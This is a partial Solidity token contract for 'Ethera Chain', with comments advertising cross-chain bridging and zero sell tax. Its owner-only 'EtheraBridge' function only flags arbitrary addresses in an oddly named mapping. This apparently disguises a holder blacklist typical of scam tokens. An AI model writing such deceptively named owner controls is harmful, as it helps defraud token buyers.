...
// Transferring assets and data between the chains has been one of the biggest challenges in the crypto space. 
// Blockchains operate in isolation from each other which limits their uses and growth. There is a
// lack of a protocol or framework to enable interoperability between the chains which can unlock the true potential of the blockchain ecosystems.
// Ethera 3.0 ( No Tax 0% Sell & Buy )
...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Ethera Chain';
    ...
    function EtheraBridge(address account) public onlyOwner {
        _rebuildsolidity[account] = true;
    }

    function EtheraCrossBridge(address account) public view returns (bool) {
...
contract PrivateEthera is BaseToken {
